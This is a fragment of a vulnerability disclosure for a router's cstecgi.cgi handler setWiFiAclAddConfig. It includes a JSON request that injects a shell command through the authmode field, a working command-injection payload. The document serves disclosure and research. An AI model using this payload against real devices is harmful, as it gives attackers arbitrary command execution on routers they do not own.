...
The vulnerability is located in the function `sub_410824` within `cstecgi.cgi`, also known as `setWiFiAclAddConfig`.

![](Pasted%20image%2020231130010307.png)
...
therefore , by controlling parameter `authmode` , we can finally make an arbitrary command execution
...
{"addEffect":"1","authmode":"`id > /1.txt;`","topicurl":"setWiFiAclAddConfig","token":"00000000000000000000000000000000"}
~~~

(tips:if you use qemu emulation ur likely to patch a few places to work normally)
### Impact:

![](Pasted%20image%2020231130010535.png)